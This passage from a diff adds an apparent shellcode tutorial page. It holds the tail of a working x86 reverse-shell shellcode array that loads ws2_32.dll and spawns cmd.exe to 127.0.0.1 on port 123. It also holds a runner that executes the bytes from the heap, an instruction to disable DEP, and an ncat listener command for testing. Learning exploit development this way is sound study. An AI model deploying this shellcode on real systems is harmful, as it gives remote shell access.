+        "\x1b\x89\x44\x24\x0c\xe8\x60\x01\x05\x05\xb9\xe2\xfa\x1b\x01\xe8"
+        "\x56\x01\x05\x05\xb9\xc9\x53\x29\xdc\x89\x44\x24\x20\xe8\x48\x01"
+        "\x05\x05\xb9\x6e\x85\x1c\x5c\x89\x44\x24\x1c\xe8\x3a\x01\x05\x05"
+        "\xb9\xe0\x53\x31\x4b\x89\x44\x24\x24\xe8\x2c\x01\x05\x05\xb9\x98"
+        "\x94\x8e\xca\x8b\xd8\xe8\x20\x01\x05\x05\x89\x44\x24\x10\x8d\x84"
+        "\x24\xa0\x05\x05\x05\x50\x68\x02\x02\x05\x05\xff\xd6\x33\xc9\x85"
+        "\xc0\x0f\x85\xd8\x05\x05\x05\x51\x51\x51\x6a\x06\x6a\x01\x6a\x02"
+        "\x58\x50\xff\xd7\x8b\xf0\x33\xff\x83\xfe\xff\x0f\x84\xc0\x05\x05"
+        "\x05\x8d\x44\x24\x14\x50\x57\x57\x68\x9a\x02\x05\x05\xff\x54\x24"
+        "\x2c\x85\xc0\x0f\x85\xa8\x05\x05\x05\x6a\x02\x57\x57\x6a\x10\x8d"
+        "\x44\x24\x58\x50\x8b\x44\x24\x28\xff\x70\x10\xff\x70\x18\xff\x54"
+        "\x24\x40\x6a\x02\x58\x66\x89\x44\x24\x28\xb8\x05\x7b\x05\x05\x66"
+        "\x89\x44\x24\x2a\x8d\x44\x24\x48\x50\xff\x54\x24\x24\x57\x57\x57"
+        "\x57\x89\x44\x24\x3c\x8d\x44\x24\x38\x6a\x10\x50\x56\xff\x54\x24"
+        "\x34\x85\xc0\x75\x5c\x6a\x44\x5f\x8b\xcf\x8d\x44\x24\x58\x33\xd2"
+        "\x88\x10\x40\x49\x75\xfa\x8d\x44\x24\x38\x89\x7c\x24\x58\x50\x8d"
+        "\x44\x24\x5c\xc7\x84\x24\x88\x05\x05\x05\x05\x01\x05\x05\x50\x52"
+        "\x52\x52\x6a\x01\x52\x52\x68\x92\x02\x05\x05\x52\x89\xb4\x24\xc0"
+        "\x05\x05\x05\x89\xb4\x24\xbc\x05\x05\x05\x89\xb4\x24\xb8\x05\x05"
+        "\x05\xff\x54\x24\x34\x6a\xff\xff\x74\x24\x3c\xff\x54\x24\x18\x33"
+        "\xff\x57\xff\xd3\x5f\x5e\x33\xc0\x5b\x8b\xe5\x5d\xc3\x33\xd2\xeb"
+        "\x10\xc1\xca\x0d\x3c\x61\x0f\xbe\xc0\x7c\x03\x83\xe8\x20\x03\xd0"
+        "\x41\x8a\x01\x84\xc0\x75\xea\x8b\xc2\xc3\x55\x8b\xec\x83\xec\x14"
+        "\x53\x56\x57\x89\x4d\xf4\x64\xa1\x30\x05\x05\x05\x89\x45\xfc\x8b"
+        "\x45\xfc\x8b\x40\x0c\x8b\x40\x14\x8b\xf8\x89\x45\xec\x8d\x47\xf8"
+        "\x8b\x3f\x8b\x70\x18\x85\xf6\x74\x4f\x8b\x46\x3c\x8b\x5c\x30\x78"
+        "\x85\xdb\x74\x44\x8b\x4c\x33\x0c\x03\xce\xe8\x9e\xff\xff\xff\x8b"
+        "\x4c\x33\x20\x89\x45\xf8\x03\xce\x33\xc0\x89\x4d\xf0\x89\x45\xfc"
+        "\x39\x44\x33\x18\x76\x22\x8b\x0c\x81\x03\xce\xe8\x7d\xff\xff\xff"
+        "\x03\x45\xf8\x39\x45\xf4\x74\x1e\x8b\x45\xfc\x8b\x4d\xf0\x40\x89"
+        "\x45\xfc\x3b\x44\x33\x18\x72\xde\x3b\x7d\xec\x75\xa0\x33\xc0\x5f"
+        "\x5e\x5b\x8b\xe5\x5d\xc3\x8b\x4d\xfc\x8b\x44\x33\x24\x8d\x04\x48"
+        "\x0f\xb7\x0c\x30\x8b\x44\x33\x1c\x8d\x04\x88\x8b\x04\x30\x03\xc6"
+        "\xeb\xdd\x2f\x05\x05\x05\xf2\x05\x05\x05\x80\x01\x05\x05\x77\x73"
+        "\x32\x5f\x33\x32\x2e\x64\x6c\x6c\x05\x63\x6d\x64\x2e\x65\x78\x65"
+        "\x05\x31\x32\x37\x2e\x30\x2e\x30\x2e\x31\x05";
+
+    static_assert(sizeof(shellcode) &gt; 4, "Use 'char shellcode[] = ...' (not 'char *shellcode = ...')");
+
+    // We copy the shellcode to the heap so that it's in writeable memory and can modify itself.
+    char *ptr = new char[sizeof(shellcode)];
+    memcpy(ptr, shellcode, sizeof(shellcode));
+    ((void(*)())ptr)();
+}
+</code></pre>
+
+<p>To make this code work, you need to disable <span style="color: #00ccff;">DEP</span> (<span style="color: #00ccff;">D</span>ata <span style="color: #00ccff;">E</span>xecution <span style="color: #00ccff;">P</span>revention) by going to <span style="color: #00ff00;">Project</span>→<span style="color: #00ff00;">&lt;solution name&gt; Properties</span> and then, under <span style="color: #00ff00;">Configuration Properties</span>, <span style="color: #00ff00;">Linker</span> and <span style="color: #00ff00;">Advanced</span>, set <span style="color: #00ff00;">Data Execution Prevention (DEP)</span> to <span style="color: #00ff00;">No (/NXCOMPAT:NO)</span>. This is needed because our shellcode will be executed from the heap which wouldn’t be executable with DEP activated.</p><p><span style="color: #00ff00;">static_assert</span> was introduced with C++11 (so VS 2013 CTP is required) and here is used to check that you use</p>
+
+<pre><code class="language-cpp">char shellcode[] = "..."
+</code></pre>
+
+<p>instead of</p>
+
+<pre><code class="language-cpp">char *shellcode = "..."
+</code></pre>
+
+<p>In the first case, <span style="color: #00ff00;">sizeof(shellcode)</span> is the effective length of the shellcode and the shellcode is copied onto the stack. In the second case, <span style="color: #00ff00;">sizeof(shellcode)</span> is just the size of the pointer (i.e. 4) and the pointer points to the shellcode in the <span style="color: #00ff00;">.rdata</span> section.</p><p>To test the shellcode, just open a cmd shell and enter</p><pre class="ignore:true">ncat -lvp 123</pre><p>Then, run the shellcode and see if it works.</p> </div></div>
+
+</body>
+</html>
